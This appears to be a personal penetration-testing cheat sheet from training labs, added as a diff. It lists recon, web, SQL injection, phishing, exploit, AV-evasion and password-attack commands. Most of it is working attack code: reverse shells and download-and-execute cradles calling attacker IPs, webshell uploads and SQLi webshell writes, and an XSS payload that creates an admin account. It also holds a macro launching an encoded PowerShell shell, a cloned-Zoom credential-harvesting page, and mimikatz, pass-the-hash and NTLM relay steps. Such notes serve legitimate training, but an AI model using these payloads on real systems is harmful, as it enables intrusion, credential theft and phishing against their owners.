@@ -1,0 +1,1388 @@
+____________________________________________________________________________________________
+
+***Information Gathering***
+
+whois megacorpone.com -h 192.168.50.251
+whois 38.100.193.70 -h 192.168.50.251
+
+google search: site:megacorpone.com  ext:php, ext:xml, and
+ext:py -filetype:html filetype:txt intitle:"index of" "parent directory" 	[- to exclude]
+https://www.exploit-db.com/google-hacking-database
+
+Basic Information Gathering
+	2.	site:megacorpone.com -www 		(To identify subdomains.)
+Directory and File Discovery
+	3.	site:megacorpone.com intitle:"index of"
+	4.	site:megacorpone.com ext:php | ext:html | ext:asp | ext:jsp
+	5.	site:megacorpone.com filetype:pdf | filetype:doc | filetype:docx | filetype:xls | filetype:xlsx
+Vulnerable Pages or Parameters
+	6.	site:megacorpone.com inurl:"admin" inurl:"login" inurl:"signup" inurl:"register" inurl:"forgot password" inurl:"upload"
+Configuration Files and Sensitive Data
+	12.	site:megacorpone.com ext:env | ext:yaml | ext:json | ext:xml | ext:conf | ext:ini | ext:log
+	14.	site:megacorpone.com "password" filetype:txt | filetype:csv
+Leaked Information
+	15.	site:megacorpone.com "username" "password" "confidential" "private"
+Source Code and Repositories
+	18.	site:megacorpone.com ext:sql | ext:db
+	19.	site:megacorpone.com "gitlab" | "github" | "bitbucket"
+	20.	site:megacorpone.com "source code"
+
+Wappalyzer - wappalyzer.com
+
+github search - owner:megacorpone path:users			[path: filename search]
+./gitleaks-linux-amd64 -v -r=https://github.com/repo [or Gitrob]
+
+https://www.shodan.io/ hostname:megacorpone.com		(crawls also IoT and routers, devices etc)
+https://securityheaders.com/
+https://www.ssllabs.com/ssltest/
+
+./Sublist3r/Subfinder				[subdomain enum]
+host -t txt -t mx megacorpone.com		[dns mx or txt records]
+
+dnsrecon -d megacorpone.com -t std					
+dnsrecon -d megacorpone.com -D /usr/share/seclists/list.txt -t brt	[subdomain bruteforcing]
+dnsenum megacorpone.com							[subdomain bruteforcing]
+
+nslookup mail.megacorptwo.com						[windows tool]
+nslookup -type=TXT info.megacorptwo.com 192.168.50.151
+
+nc -nvv -w 1 -z 192.168.50.152 3388-3390				[a nc port scan, (-u for udp)]
+(The -Pn option in Nmap disables host discovery (ping scan) and treats all targets as online, useful for scanning hosts that might appear to be down because they block ICMP requests.)
+sudo nmap -sS 192.168.50.149				[SYN scan - default if sudo]
+nmap -sT 192.168.50.149					[CONNECT scan - slower, need to use if proxy maybe]
+sudo nmap -sU 192.168.50.149				[UDP scan]
+sudo nmap -sU -sS 192.168.50.149			[TCP+UDP]
+nmap -p 80 192.168.50.1-253 -oG web-sweep.txt | grep open
+nmap -sT -A -o --top-ports=20 192.168.50.1		[-o for OS fingerprinting and -A for scripts/traceroute]
+nmap --script http-headers 192.168.50.6			(/usr/share/nmap/scripts)
+
+[win if nmap is not available]:
+Test-NetConnection -Port 445 192.168.50.151
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
+
+[SMB]
+sudo nbtscan -r 192.168.50.0/24				[enumerate NetBIOS services on port 139/137]
+nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
+net view \\dc01 /all					[win command for smb enum]
+enum4linux -a 192.168.55.151
+
+[SMTP]
+nc -nv 192.168.50.8 25		(or telnet 192.168.50.8 25)
+VRFY root
+
+[SNMP]
+sudo nmap -sU -p 161 192.168.50.1-254
+echo public > community
+echo private >> community
+echo manager >> community
+for ip in $(seq 1 254); do echo 192.168.153.$ip; done > ips
+onesixtyone -c community -i ips
+snmpwalk -c public -v1 -t 10 192.168.50.151					(-Oa to translate hex to ascii)
+snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25 [users]
+snmpwalk -c public -v1 192.168.153.151 1.3.6.1.2.1.25.4.2.1.2 [processes]
+snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2 [installed programs]
+snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3 [listening ports]
+
+gobuster dns -d megacorpone.com -w wordlist.txt -t 10
+
+__________________________________________________________________________________________________________________________
+
+VULNERABILITY SCANNING
+
+sudo apt install ./Nessus-10.5.0-debian10_amd64.deb
+sudo systemctl start nessusd.service
+https://127.0.0.1:8834
+
+sudo nmap -sV -p 443 --script "vuln" 192.168.50.124
+[adding to nmap scripts db a new nse found from a github repo:]
+sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
+sudo nmap --script-updatedb
+sudo nmap -sV -p 443 --script http-vuln-cve2021-41773 192.168.50.124
+
+[WARNING: 1. CURL does normalization and ruins path traversal vulnerabilities so below does not work, use Burp instead. 
+2. Use http instead of https for Offsec labs even though it is 443 as they never have TLS.]
+curl --path-as-is "http://192.168.126.13:443/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"  
+
+__________________________________________________________________________________________________________________
+
+WEB APPLICATION ATTACKS
+
+sudo nmap -p80 --script=http-enum 192.168.50.20
+
+[Non-standard headers: X-Powered-By, x-amz-cf-id, and X-Aspnet-Version..]
+
+http://192.168.50.126:8080/robots.txt and sitemap.xml [discover hidden paths in the webapp]
+
+gobuster dir -u 192.168.162.52 -w /usr/share/wordlists/dirb/common.txt -t 5
+
+[API enumeration with gobuster:]
+cat pattern.txt
+    {GOBUSTER}/v1
+    {GOBUSTER}/v2
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
+gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt [exposing api endpoints after finding a /users/v1/ api endpoint]
+
+[enumerating and abusing APIs with curl:]
+curl -i http://192.168.50.16:5002/users/v1/login [exposing api endpoint]
+curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
+curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+(Response received:
+{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"})
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+ // --proxy 127.0.0.1:8080 to send it to the proxy (such as burp)
+
+User-Agent: <script>alert(42)</script>		(wp visitors plugin that has a XSS vuln: inserting user-agent into <td> element directly)
+
+[xss attack, create nonce]
+var ajaxRequest = new XMLHttpRequest();
+var requestURL = "/wp-admin/user-new.php";
+var nonceRegex = /ser" value="([^"]*?)"/g;
+ajaxRequest.open("GET", requestURL, false);
+ajaxRequest.send();
+var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
+var nonce = nonceMatch[1];
+nonce;
+[js payload]
+var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
+ajaxRequest = new XMLHttpRequest();
+ajaxRequest.open("POST", requestURL, true);
+ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+ajaxRequest.send(params);
+[minify the js code here: https://jscompress.com/]
+[encode minified payload:]
+function encode_to_javascript(string) {
+            var input = string
+            var output = '';
+            for(pos = 0; pos < input.length; pos++) {
+                output += input.charCodeAt(pos);
+                if(pos != (input.length - 1)) {
+                    output += ",";
+                }
+            }
+            return output;
+        }
+let encoded = encode_to_javascript('insert_minified_javascript')
+console.log(encoded)
+[run payload]
+curl -i http://192.168.246.16/ --user-agent "<script>eval(String.fromCharCode(118,97,114.....9,115,41,59))</script>" 
+
+[WP Admin Login Theme Editor Reverse Shell:]
+(edit a theme's 404 page to be a php reverse shell, then curl:)
+curl http://offsecwp/wp-content/themes/twentynineteen/404.php
+
+[WP Plugin RevShell:]
+(PHP Reverse Shell one-liner:)
+$sock=fsockopen("192.168.45.236",9001);
+$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+(added to a function of a plugin that gets triggered by every page load)
+
+[Directory Traversal]
+
+(the application has a http://mountaindesserts.com/meteor/index.php?page=admin.php link, which indicates the web application includes the content of this page via the page parameter and displays it on that page area)
+http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
+http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+ssh -i private_key.file -p 2222 offsec@mountaindesserts.com (chmod 400 private_key first)
+
+[win]
+C:\Windows\System32\drivers\etc\hosts	(test for dir traversal, as this is readable by all local users)
+C:\inetpub\logs\LogFiles\W3SVC1\ and C:\inetpub\wwwroot\web.config [IIS log files]
+
+curl --path-as-is "http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords"
+curl --path-as-is "http://192.168.50.16/cgi-bin/.%2e/.%2e/.%2e/.%2e/opt/passwords" [apache path traversal]
+
+[Local File Inclusion (LFI)]
+
+[Log Poisoning]
+(first we review the log file to see what is controlled by user input)
+curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?> [included to http header user agent section]
+curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
+
+C:\xampp\apache\logs\ [logs path for xamp]
+
+[bash reverse shell one liner]
+bash -c "bash -i >& /dev/tcp/192.168.45.192/443 0>&1"
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.211%2F9000%200%3E%261%22
+
+[PHP Wrappers]
+[php://filter]
+curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+echo "PCFET0NUWVBFIGh0bWw+Cj.....seSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
+[data://]
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
+(or if it hits firewall:)
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0o.....Pg==&cmd=ls"
+
+[Remote File Inclusion (RFI)]
+
+python3 -m http.server 80 [start in  /usr/share/webshells/php/ ]
+curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls" [how to find IP>ifconfig tun0]
+
+[File Upload Vulnerabilities]
+
+(alternative php file extensions for file upload vulnerabilities:) .phps .php7 .pHP // or upload as txt and rename later
+curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
+curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=nc -nv 192.168.50.129 6666 -e /bin/bash" [nc reverse shell]
+
+[powershell one liner reverse shell]
+pwsh
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.211",9000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20[Base64 encoded reverse shell]
+
+[SSH authorized_keys Overwrite Using File Upload Vulnerability]
+ssh-keygen
+cat fileup.pub > authorized_keys
+(Now that the authorized_keys file contains our public key, we can upload it using the relative path)
+../../../../../../../root/.ssh/authorized_keys
+ssh -p 2222 -i fileup root@mountaindesserts.com
+
+[Command Injection]
+
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive [a web app running git commands from user inp]
+(&& or ; for linux, & for win, url encoded)
+
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell [code snippet to show if we are on cmd or pwsh]
+
+[Powercat (win netcat shell)]
+cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.236/powercat.ps1");powercat -c 192.168.45.204 -p 9000 -e powershell [download and execute powercat reverse shell]
+
+(command injection special char fuzzing)
+ffuf -u http://192.168.102.16/login -d 'username=ippsec&password=password&ffa=FUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt -H 'Content-Type: application/x-www-form-urlencoded' -t 1  
+
+[python popen exploit]
+(payload = " ; whoami # )
+username=ippsec&password=PASSWORD&ffa="+%3b+echo+[BASE64 ENCODED PYTHON SHELL ONE LINER]+|+base64+-d+|+bash+%23
+
+cp /usr/share/webshells/aspx/cmdasp.aspx .	(file upload vuln on IIS server, so we used this webshell)
+
+__________________________________________________________________________________________
+
+SQL INJECTION ATTACKS
+
+mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert
+mysql -u gollum -p'HeliosPanther#'
+select system_user();
+show databases;
+
+[login to mssql:]
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+SELECT @@version;
+SELECT name FROM sys.databases; [to list all available databases]
+SELECT * FROM master.information_schema.tables; [to list tables]
+select * from msdb.dbo.syscachedcredentials; [We'll need to specify the dbo table schema between the database and the table names.]
+
+[Manual SQL Exploitation]
+
+[Error Based Payloads]
+offsec' OR 1=1 -- //
+offsec' or 1=1 in (select @@version) -- // [error based payload to get version number]
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+
+[Union Based Payloads]
+' ORDER BY 6-- // 	[enumerate number of columns in table, starting from 1 and increasing the column value by one each time, we'll discover that the table has five columns since ordering by column six returns an error: Unknown column 6 in order clause]
+%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- // 	(to visualize which displayed data on the page corresponds to which column, as some of the columns may be hidden as well as enum expected dtype)
+' UNION SELECT null, null, database(), user(), @@version  -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //			(enumerate current db tables and columns)
+' UNION SELECT null, username, password, description, null FROM users -- //
+
+[Blind SQL Injections]
+(this example application takes user as param and queries user's records)
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //                           [enumerate users]
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //    [enumerate users]
+
+[MSSQL command execution]
+impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+EXECUTE sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXECUTE sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXECUTE xp_cmdshell 'whoami';
+
+[Mysql Write Files On the Webserver]
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
+[then use as /tmp/webshell.php?cmd=whoami]
+
+sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump --threads 3
+sqlmap -r post.req -p item  --os-shell  --web-root "/var/www/html/tmp" [with saved burp post request]
+
+__________________________________________________________________________________________________________
+
+PHISHING
+
+https://github.com/fkasler/cuddlephish [browser-in-the-middle attack]
+
+(chatgpt prompt:Write another email in the same style as this, and include a reminder for employees to login to Zoom. Include a hyperlink that can be clicked and directs people to the appropriate page.)
+
+[Clone Phishing]
+
+[Download the webpage]
+wget -E -k -K -p -e robots=off -H -D zoom.us -nd "https://zoom.us/signin#/login" 
+mv -f * /var/www/html
+systemctl start apache2
+cd /var/www/html
+[custom-login.php page to use in the clone form:]
+<?php
+if (isset($_POST['email']) && isset($_POST['password'])) {
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+    $file = 'credentials.txt';
+    $data = "Email: " . $email . "\nPassword: " . $password . "\n\n";
+    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) === false) {
+        echo "Error writing to file.";
+        exit();
+    }
+    header('Location: https://zoom.us/signin#/login');
+    exit();
+} else {
+    echo "Please ensure both email and password are provided.";
+}
+?>
+sudo echo "" > credentials.txt
+sudo chmod 777 custom_login.php
+sudo chmod 777 credentials.txt
+http://192.168.45.247/signin.html#/login		[phishing link]
+
+_____________________________________________________________________________________
+
+CLIENT SIDE ATTACKS
+
+[file metadata]
+exiftool -a -u brochure.pdf
+gobuster dir -u 192.168.162.52 -w /usr/share/wordlists/dirb/common.txt -t 5 -x pdf
+
+http://canarytokens.com [client fingerprinting (os,ip,geo,user-agent etc) token link]
+[We could also use an online IP logger like Grabify or JavaScript fingerprinting libraries such as fingerprint.js]
+
+[rdp commands]
+rdesktop 192.168.153.152 -u student -p lab
+xfreerdp3 /u:offsec /p:lab /v:192.168.246.196 
+xfreerdp3 /u:offsec /p:lab /v:192.168.145.61 /clipboard /drive:kali,/home/kali
+
+[office macro reverse shell]
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.202:80/powercat.ps1');powercat -c 192.168.45.202 -p 9000 -e powershell [powercat download cradle and start reverse shell]
+[--->>> base64 encode to UTF16LE for win systems]
+[py script to split it into smaller chunks]
+str = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwA..."
+n = 50
+for i in range(0, len(str), n):
+	print("Str = Str + " + '"' + str[i:i+n] + '"')
+[macro:]
+Sub AutoOpen()
+    MyMacro
+End Sub
+Sub Document_Open()
+    MyMacro
+End Sub
+Sub MyMacro()
+    Dim Str As String
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+    CreateObject("Wscript.Shell").Run Str
+End Sub
+
+[Windows Library Files]
+
+[webdav share and win library files]
+sudo apt install python3-wsgidav
+mkdir /home/kali/webdav
+/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+[next, create config.library-ms file in win machine:]
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.152</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+(next, create a shortcut in win machine for pwsh reverse shell script:)
+powershell.exe -c "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.160:8000/powercat.ps1'); powercat -c 192.168.45.160 -p 4444 -e powershell"
+
+____________________________________________________________________________________
+
+EXPLOITS
+
+https://www.exploit-db.com/
+https://github.com/offensive-security
+
+[searchsploit]
+sudo apt update && sudo apt install exploitdb
+ls -l /usr/share/exploitdb/exploits
+searchsploit remote smb microsoft windows
+searchsploit -m windows/remote/48537.py //copy the exploit to cwd
+
+[nmap nse scripts]
+nmap --script-help=clamav-exec.nse
+grep Exploits /usr/share/nmap/scripts/*.nse
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe [generate payload]
+
+sudo apt install mingw-w64 [cross compiler for exploits requiring windows environment]
+i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+sudo wine exploit.exe [to run compiled exploit for win in nix environment]
+
+[Buffer Overflow]
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c  e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" [-b bad characters indicated in buffer overflow exploit code. we replace this our own payload with the shellcode found in the exploit code]
+(>> On the Windows 10 client. Next, we can launch Immunity Debugger as administrator, click on File > Attach, and select the syncbrs process.  We'll return to Immunity Debugger with Sync Breeze attached and press Ctrl+G, follow the JMP ESP address at 0x10090c83, and press F2 to set a breakpoint on it.)
+
+[fixing web app exploits]
+response  = requests.post(url, data=data, allow_redirects=False, verify=False) [ssl will be ignored in exploit code requests if we set verify=False]
+
+[mfsconsole]
+sessions -i 1
+shell
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")' [get interactive shell]
+
+__________________________________________________________________________________________________________________
+
+ANTIVIRUS EVASION
+
+virustotal.com
+https://kleenscan.com/
+
+[Remote Process Memory Thread Injection]
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection [powershell reflection payload for remote process memory thread injection technique]
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser [bypass execution policy running ps scripts]
+
+[Automatic AV Evasion]
+
+[Shellter]
+sudo apt install shellter
+[img:antivirus-evasion-shellter.png]
+[img:antivirus-evasion-shellter2.png]
+sudo apt install wine								(shellter runs on wine)
+sudo dpkg --add-architecture i386 && sudo apt-get update &&
+sudo apt-get install wine32 							[install wine with win32 support]
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.249;set LPORT 9000;run;"					[start meterpreter listener in metasploit. note: non-meterpreter payloads DONOT work in win 11]
+
+ftp -A 192.168.145.53 and ftp > bin 		[set ftp to active and binary mode to put exe files]
+
+[VEIL]  [can generate pwsh bat files as well]
+apt -y install veil
+/usr/share/veil/config/setup.sh --force --silent
+/usr/share/veil/Veil.py					
+./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 192.168.45.249 --port 9002
+
+___________________________________________________________________________________________________________________
+ 
+PASSWORD ATTACKS
+
+[Hydra] 
+cd /usr/share/wordlists/
+sudo gzip -d rockyou.txt.gz
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202 [common usernames list in names.txt]
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"  [colon delimited 3 areas: the location of the login form,request body retrieved from burp,the failed login identifier]
+hydra -l alfred -P /usr/share/wordlists/rockyou.txt 192.168.227.201 -s 8080 http-post-form  "/:fm_usr=alfred&fm_pwd=^PASS^:F=302"		(status 302 on failure (or S for success), -s port)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://192.168.240.201 [HTTP Basic authentication(browser shows login popup)]
+
+[Hashcat]
+hashcat -b [benchmark mode to calculate hash rate. then time = keyset / hash rate]
+cat demo3.rule   
+	$1 c $!
+	$2 c $!						[most common special characters "!", "@", and "#"]
+	$1 $2 $3 c $!		[rule file for hashcat specifying append 1,capitalize,append ! to each pwd,etc]
+	u d						[uppercase and duplicate]				
+hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force [-m option to choose hash]
+ls -la /usr/share/hashcat/rules/ 
+hashid 'HASH-TO-CRACK' -m -j [m and j shows corresponding hashcat and johntheripper mode]
+hash-identifier
+
+[KeePass Password Manager]
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue [search for KeePass db file]
+keepass2john Database.kdbx > keepass.hash 			  [transform to JtR/hashcat compatible hash file]
+[next, delete "filename:" string from the beginning of the file]
+hashcat -hh | grep -i "KeePass" 			        	[find correct mode for KeePass hash]
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+kpcli --kdb database.kdbx	(view entries of database.kdbx on kali after cracking the master pass)
+
+[SSH Private Key Passphrase]
+ssh2john id_rsa > ssh.hash
+[next, delete "filename:" string from the beginning of the file]
+[next, hashcat does not support ssh aes-256-ctr, so we will use JtR]
+[add [List.Rules:sshRules] to the beginning of the rule file to use with JtR]
+sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'		[add custom rule to JtR rule conf file]
+john --wordlist=sshpasswords --rules=sshRules ssh.hash
+
+hashcat --stdout -r rules.rule basewords.txt > passwords.txt		[use hashcat to add rule generated password list]
+
+sed -Ei '/([0-9].*){3}/!d; /[A-Z]/!d; /[a-z]/!d; /[!@#]/!d' passwords.txt [delete passwords donot abide by password policy]
+
+[NTLM Hash Cracking] [mimikatz require local admin]
+PS > Get-LocalUser		(which users exist locally on the system)
+PS C:\tools> .\mimikatz.exe
+mimikatz > privilege::debug 		(elevate SeDebugPrivilege)
+mimikatz > token::elevate
+mimikatz > sekurlsa::logonpasswords (extract all passwords and hashes)
+mimikatz > lsadump::sam			(extract the NTLM hashes from the SAM)
+hashcat -hh | grep -i "ntlm"
+hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force
+
+[NTLM Pass-the-Hash] (local admin, pass too complex to crack)
+[To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes. 
+We can use smbclient or CrackMapExec for SMB enumeration and management. 
+We can use the scripts from the impacket library like psexec.py and wmiexec.py for command execution. 
+Also via other protocols like RDP and WinRM if the user has the required rights. 
+We can also use Mimikatz to conduct pass-the-hash as well.]
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b	(file/folder access)
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+(to obtain shell as system. -hashes format is LMHash:NTHash.)
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+(to obtain shell as this hash's owner user)
+
+[NTLMv2] [if we dont have local admin or admin group]
+sudo responder -I tap0 		                (tap0 is our kali interface found from ip a, start a smb server)
+dir "\\192.168.45.202\share\test"		[run on target to access to that smb share]
+hashcat -hh | grep -i "NetNTLMv2"
+hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
+[BURP REQUEST:] Content-Disposition: filename="\\\\192.168.45.202\\share\\nonexistent.txt"
+(if the web application supports file upload over smb, responder running smb share will grab ntlmv2 hash)
+
+[NTLMv2 Relay Attack] (no local admin, pass too complex to crack, UAC remote restrictions disabled)
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+dir "\\192.168.45.202\share\test"
+
+[POWERSHELL REVERSE SHELL ONE LINER]
+$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+[Domain Hashes] 
+xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.246 /dynamic-resolution (trigger login to have LSASS cache the user's hash)
+PS C:\tools> .\mimikatz.exe
+mimikatz > privilege::debug
+mimikatz > sekurlsa::logonpasswords
+impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
+PS > Get-ComputerInfo [to check if Credential Guard is running, in which case mimikatz cannot access lsass for non-local users]
+mimikatz > misc::memssp 	(if sekurlsa does not work as in above situation)
+(then, after triggering a login,)
+type C:\Windows\System32\mimilsa.log
+
+_______________________________________________________________________________________________________________
+
+WINDOWS PRIVILEGE ESCALATION
+
+[Information Gathering]
+whoami /groups
+whoami /priv
+net user or PS > Get-LocalUser		(which users exist locally on the system)
+net localgroup or PS > Get-LocalGroup	(list local groups)
+PS > Get-LocalGroupMember Administrators	(list group members)
+systeminfo
+ipconfig /all
+route print			(routing table)
+netstat -ano			(active ports)
